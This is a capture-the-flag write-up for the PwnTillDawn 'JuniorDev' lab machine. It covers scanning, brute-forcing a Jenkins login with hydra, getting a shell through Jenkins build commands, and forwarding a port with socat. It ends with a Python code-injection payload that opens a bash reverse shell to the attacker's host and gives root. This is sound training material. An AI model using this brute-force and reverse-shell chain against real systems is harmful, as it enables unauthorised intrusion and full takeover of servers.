---
title: JuniorDev
category: [writeups,PwnTillDawn]
tags: [Linux,Privilege-Escalation,Brute-Force-HTTP,Jenkins,Python-Reverse-Shell]
---
# JuniorDev
- Difficulty : `Medium`
- IP Address : `10.150.150.38`
- Operating System : `Linux`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)


## Nmap Result
```
Nmap scan report for 10.150.150.38
Host is up, received conn-refused (0.26s latency).
Scanned at 2022-07-22 06:34:03 UTC for 21s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS+QWVcu1zxskqQlAhiDevVZGELmunvGSY1QynJN6wMKOMgEwQRVzF4l5YWWN+ZaGpPdhU2XCGX1IaTj1xrOG7vsit6XnKgcDzuqC6kY9Th0imreOL6+zAStlbNy/Qf/kmeH7BZe2vlouZwXSFWanuLEB/Mp0VIHrrgCe9+ISKAdib2+P9oWwrr5UteR4S+0djaQE6fTvB/MVzrsv29NsTCsuqQUF8xGja9Lxcr4MSVyiIlYig2f34nY/p7nBXsWPJhahbE0hLIvCQJ38hIN5pk+X/o9Fg3GNUG3j3t2+itO+xK/Z04ZAAIWEBTIeVjMzAtXdOTkasHNiScHoXkJUT
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFd0nu2Txef4uPqi/WwDfWicDjg0ZQ+cCrCV7l5jmI8I8GJJvIQAVcyEl/KK5Jjz2qfTPf1mhSI+ItxzVXznzus=
|   256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIANsHUsoN3LKfPQEpEVxGpdblKhhyYVP524W40rTzesj
30609/tcp open  http    syn-ack Jetty 9.4.27.v20200227
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
In this challenge, we will start of with website on port 30609 instead of the usual port.
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-1.png)
<br>
Since it is a login form, we will always start with the basic which is SQL injection and default credentials. After trying both of these, it seems that the login form is not vulnearable to sql injection. As for default credentials, jenkins only provide username `admin` while the password is different for every user. The next method that i had in mind is bruteforcing with `hydra`. It is abit complicated to bruteforce with hydrs we will need to prepared some information.
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-2.png)
<br>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-22 02:49:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.150.150.38:30609/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError
[STATUS] 377.00 tries/min, 377 tries in 00:01h, 14344022 to do in 634:08h, 16 active
[30609][http-post-form] host: 10.150.150.38   login: admin   password: matrix
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-22 02:51:27

-------------------------------------------------------------------------
-l = username
-P = passord file
-s = port
http-post-form = post request from information gathering in inspection.
"^USER^" = must change as username will be put there
"^PASS^" = must change as password will be put there
":F=loginError" = loginError message == fail
--------------------------------------------------------------------------
```
We managed to found a password which allow us to login into the website. 
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-3.png)
<br>
After wondering around with the website, it looks like there is a function which execute command from shell. 
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-4.png)
<br>
Since it is possible to execute command, we could make use of it and get a reverse shell.
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-5.png)
<br>
After completing everything, build it and a reverse shell should spawn is everything is done correctly.
```
nc -nvlp 1234                       
listening on [any] 1234 ...
connect to [10.66.67.2] from (UNKNOWN) [10.150.150.38] 58732
bash: cannot set terminal process group (464): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@dev1:~/workspace/test$ id
id
uid=105(jenkins) gid=112(jenkins) groups=112(jenkins)
jenkins@dev1:~/workspace/test$ 
```
We manage to get ourselves a reverse shell but not root. Therefore we will move on with privilege escalation.

# Privilege Escalation
When it comes to privilege escalation, it is always good to use `linpeas.sh` as it helps us to check method to privilege escalation easily. After searching for information, we managed to found a clue which might be our next stop.
```
jenkins@dev1:~/workspace/test$ ps aux | grep 127.0.0.1
ps aux | grep 127.0.0.1
root        400  0.0  1.1 636804 24208 ?        Ssl  08:14   0:05 /usr/bin/python /root/mycalc/untitled.py 127.0.0.1 8080
jenkins     666  0.0  0.0   6208   820 ?        S    10:44   0:00 grep 127.0.0.1


jenkins@dev1:~/workspace/test$ netstat -tuln
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::30609                :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```
It seems that they are running a website on their localhost with python. We could have a look into it by forwarding the needed port with `socat` or any other tools.
```
./socat TCP-LISTEN:8001,fork, TCP:127.0.0.1:8080

*upload own socat to the victim machine 
```
The command is basically forwarding localhost port 8080 to it addresses on port 8001. To check it is working or not, we could check it out with rustscan.
```
Open 10.150.150.38:22
Open 10.150.150.38:8001
Open 10.150.150.38:30609
```
After wondering around the website and gathering information, it appears that the python script is acting like a calculator that could add things up. 
<br>
![](/assets/img/posts/2022-07-22-JuniorDev-6.png)
<br>
After searching for some helps about exploiting python, I came across a useful [website](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) which might help me to get another reverse shell. Since we do not have the source code, the only thing is we try and hope that it works.
```
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.67.2/1235 0>&1"')#
```

![](/assets/img/posts/2022-07-22-JuniorDev-7.png)

```
nc -nvlp 1235
listening on [any] 1235 ...
connect to [10.66.67.2] from (UNKNOWN) [10.150.150.38] 45550
bash: cannot set terminal process group (400): Inappropriate ioctl for device
bash: no job control in this shell
root@dev1:~/mycalc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dev1:~/mycalc# 
```

It works and we managed to get our shell with root account.













